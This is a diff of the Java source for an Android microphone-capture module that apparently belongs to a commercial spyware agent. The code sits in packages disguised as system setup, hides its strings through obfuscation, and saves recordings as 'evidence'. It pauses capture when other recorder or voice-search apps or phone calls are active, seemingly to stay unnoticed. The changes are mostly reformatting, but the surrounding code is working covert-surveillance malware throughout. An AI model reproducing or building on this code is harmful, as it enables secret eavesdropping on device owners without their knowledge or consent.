@@ -18,6 +18,7 @@ import android.media.MediaRecorder.OnErrorListener;
 import android.media.MediaRecorder.OnInfoListener;
 import android.speech.RecognizerIntent;
 
+import com.android.mm.M;
 import com.android.syssetup.Call;
 import com.android.syssetup.ProcessInfo;
 import com.android.syssetup.ProcessStatus;
@@ -37,7 +38,6 @@ import com.android.syssetup.manager.ManagerModule;
 import com.android.syssetup.util.ByteArray;
 import com.android.syssetup.util.Check;
 import com.android.syssetup.util.DataBuffer;
-import com.android.mm.M;
 
 import java.io.IOException;
 import java.util.HashSet;
@@ -52,31 +52,56 @@ import java.util.Set;
  */
 public abstract class ModuleMic extends BaseModule implements Observer<Call>, OnErrorListener, OnInfoListener {
 
-	private static final String TAG = "ModuleMic"; //$NON-NLS-1$
-	protected static final long MIC_PERIOD = 5000;
 	// #!AMR[space]
 	public static final byte[] AMR_HEADER = new byte[]{35, 33, 65, 77, 82, 10};
+	protected static final long MIC_PERIOD = 5000;
 	protected static final int SUSPEND_CALL = 0;
+	private static final String TAG = "ModuleMic"; //$NON-NLS-1$
 	protected static StandByObserver standbyObserver;
-
+	public Set<String> blacklist = new HashSet<String>();
 	protected int numFailures;
 	protected long fId;
 	int amr_sizes[] = {12, 13, 15, 17, 19, 20, 26, 31, 5, 6, 5, 5, 0, 0, 0, 0};
-
 	/**
 	 * The recorder.
 	 */
 	MediaRecorder recorder;
-
 	boolean phoneListening;
+	int index = 0;
+	byte[] unfinished = null;
 	private Observer<ProcessInfo> processObserver;
-
-	public Set<String> blacklist = new HashSet<String>();
 	private boolean allowResume = true;
+	private boolean callOngoing;
 
 	public ModuleMic() {
 		super();
 		resetBlacklist();
+	}
+
+	/**
+	 * Checks availability of speech recognizing Activity
+	 *
+	 * @return true – if Activity there available, false – if Activity is absent
+	 */
+	private static boolean isSpeechRecognitionActivityPresented() {
+		try {
+			// getting an instance of package manager
+			PackageManager pm = Status.getAppContext().getPackageManager();
+			// a list of activities, which can process speech recognition Intent
+			List activities = pm.queryIntentActivities(new Intent(RecognizerIntent.ACTION_RECOGNIZE_SPEECH), 0);
+
+			if (activities.size() != 0) {    // if list not empty
+				return true;                // then we can recognize the speech
+			}
+		} catch (Exception e) {
+
+		}
+
+		return false; // we have no activities to recognize the speech
+	}
+
+	public static ModuleMic self() {
+		return (ModuleMic) ManagerModule.self().get(M.e("mic"));
 	}
 
 	public synchronized void resetBlacklist() {
@@ -87,10 +112,10 @@ public abstract class ModuleMic extends BaseModule implements Observer<Call>, On
 		addBlacklist(M.e("voicerecorder"));
 		addBlacklist(M.e("voicesearch"));
 		addBlacklist(M.e("com.andrwq.recorder"));
-		if (android.os.Build.VERSION.SDK_INT > 20){
-			if(isSpeechRecognitionActivityPresented()){
+		if (android.os.Build.VERSION.SDK_INT > 20) {
+			if (isSpeechRecognitionActivityPresented()) {
 				addBlacklist(M.e("googlequicksearchbox:search"));
-			}else{
+			} else {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + "(resetBlacklist)voice Recpgnition not present");//$NON-NLS-1$
 				}
@@ -98,44 +123,21 @@ public abstract class ModuleMic extends BaseModule implements Observer<Call>, On
 		}
 	}
 
-	/**
-     * Checks availability of speech recognizing Activity
-     *
-     * @return true – if Activity there available, false – if Activity is absent
-     */
-    private static boolean isSpeechRecognitionActivityPresented() {
-        try {
-            // getting an instance of package manager
-            PackageManager pm = Status.getAppContext().getPackageManager();
-            // a list of activities, which can process speech recognition Intent
-            List activities = pm.queryIntentActivities(new Intent(RecognizerIntent.ACTION_RECOGNIZE_SPEECH), 0);
-
-            if (activities.size() != 0) {    // if list not empty
-                return true;                // then we can recognize the speech
-            }
-        } catch (Exception e) {
-
-        }
-
-        return false; // we have no activities to recognize the speech
-    }
 	public synchronized void addBlacklist(String black) {
 		blacklist.add(black);
 	}
+
 	public synchronized void delBlacklist(String black) {
 		blacklist.remove(black);
 	}
+
 	public synchronized boolean inInBlacklist(String process) {
 		return blacklist.contains(process);
 	}
 
-	public static ModuleMic self() {
-		return (ModuleMic) ManagerModule.self().get(M.e("mic"));
-	}
-
 	/*
 	 * (non-Javadoc)
-	 * 
+	 *
 	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#parse(byte[])
 	 */
 	@Override
@@ -147,7 +149,7 @@ public abstract class ModuleMic extends BaseModule implements Observer<Call>, On
 
 	/*
 	 * (non-Javadoc)
-	 * 
+	 *
 	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#begin()
 	 */
 	@Override
@@ -203,7 +205,7 @@ public abstract class ModuleMic extends BaseModule implements Observer<Call>, On
 
 	/*
 	 * (non-Javadoc)
-	 * 
+	 *
 	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#end()
 	 */
 	@Override
@@ -219,7 +221,7 @@ public abstract class ModuleMic extends BaseModule implements Observer<Call>, On
 		}
 		removePhoneListener();
 		ListenerStandby.self().detach(standbyObserver);
-		standbyObserver=null;
+		standbyObserver = null;
 		specificStop();
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (ended)");//$NON-NLS-1$
@@ -230,7 +232,7 @@ public abstract class ModuleMic extends BaseModule implements Observer<Call>, On
 
 	/*
 	 * (non-Javadoc)
-	 * 
+	 *
 	 * @see com.ht.AndroidServiceGUI.ThreadBase#go()
 	 */
 	@Override
@@ -238,15 +240,15 @@ public abstract class ModuleMic extends BaseModule implements Observer<Call>, On
 		if (Cfg.DEBUG) {
 			Check.requires(status == StateRun.STARTED, "inconsistent status"); //$NON-NLS-1$
 		}
-		if (android.os.Build.VERSION.SDK_INT > 20){
-			if(isSpeechRecognitionActivityPresented()) {
+		if (android.os.Build.VERSION.SDK_INT > 20) {
+			if (isSpeechRecognitionActivityPresented()) {
 				if (!inInBlacklist(M.e("googlequicksearchbox:search"))) {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + "(resetBlacklist)voice Recognition present ADDING in blacklist");//$NON-NLS-1$
 					}
 					addBlacklist(M.e("googlequicksearchbox:search"));
 				}
-			}else if(inInBlacklist(M.e("googlequicksearchbox:search"))){
+			} else if (inInBlacklist(M.e("googlequicksearchbox:search"))) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + "(resetBlacklist)voice Recognition not present REMOVING from blacklist");//$NON-NLS-1$
 				}
@@ -337,10 +339,6 @@ public abstract class ModuleMic extends BaseModule implements Observer<Call>, On
 			}
 		}
 	}
-
-	int index = 0;
-	byte[] unfinished = null;
-	private boolean callOngoing;
 
 	protected synchronized void saveRecorderEvidence() {
 
@@ -524,7 +522,6 @@ public abstract class ModuleMic extends BaseModule implements Observer<Call>, On
 	}
 
 
-
 	public boolean canRecordMic() {
 		if (!Status.crisisMic() && !callOngoing) {
 			if (isForegroundBlacklist() && ListenerStandby.isScreenOn()) {
@@ -534,7 +531,7 @@ public abstract class ModuleMic extends BaseModule implements Observer<Call>, On
 				return false;
 			}
 
-			if (ModuleCall.self() != null && (ModuleCall.self().isBooted()==false || ModuleCall.self().canRecord()) ) {
+			if (ModuleCall.self() != null && (ModuleCall.self().isBooted() == false || ModuleCall.self().canRecord())) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (canRecordMic) can't switch on mic because call is available");
 				}
@@ -552,7 +549,9 @@ public abstract class ModuleMic extends BaseModule implements Observer<Call>, On
 	}
 
 	abstract void specificSuspend();
+
 	abstract void specificResume();
+
 	@Override
 	public synchronized void resume() {
 		if (isSuspended() && allowResume && canRecordMic()) {
@@ -574,12 +573,13 @@ public abstract class ModuleMic extends BaseModule implements Observer<Call>, On
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (resumed)");//$NON-NLS-1$
 			}
-		}else{
+		} else {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (resume): cannot resume : allowresume="+allowResume+" canRecord "+ canRecordMic() + " isSuspended=" + isSuspended());
+				Check.log(TAG + " (resume): cannot resume : allowresume=" + allowResume + " canRecord " + canRecordMic() + " isSuspended=" + isSuspended());
 			}
 		}
 	}
+
 	@Override
 	public synchronized void suspend() {
 		if (!isSuspended()) {
